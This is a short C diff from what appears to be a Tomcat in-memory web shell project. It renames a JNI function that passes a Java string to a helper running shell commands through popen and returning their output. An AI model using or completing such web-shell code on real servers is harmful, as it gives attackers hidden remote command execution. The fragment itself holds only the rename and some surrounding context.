@@ -22,7 +22,7 @@ int execmd(const char *cmd, char *result)
     pclose(pipe); //关闭管道
     return 1;      //返回1表示运行成功
 }
-JNIEXPORT jstring JNICALL Java_org_example_tomcatmemshell_JNI_JNIMemShell_exec(JNIEnv *env, jclass clazz, jstring jstr)
+JNIEXPORT jstring JNICALL Java_org_example_tomcatmemshell_JNI_JNIMemShell_00024howToLoader_exec(JNIEnv *env, jclass clazz, jstring jstr)
 {
 
     const char *cstr = (*env)->GetStringUTFChars(env, jstr, NULL);
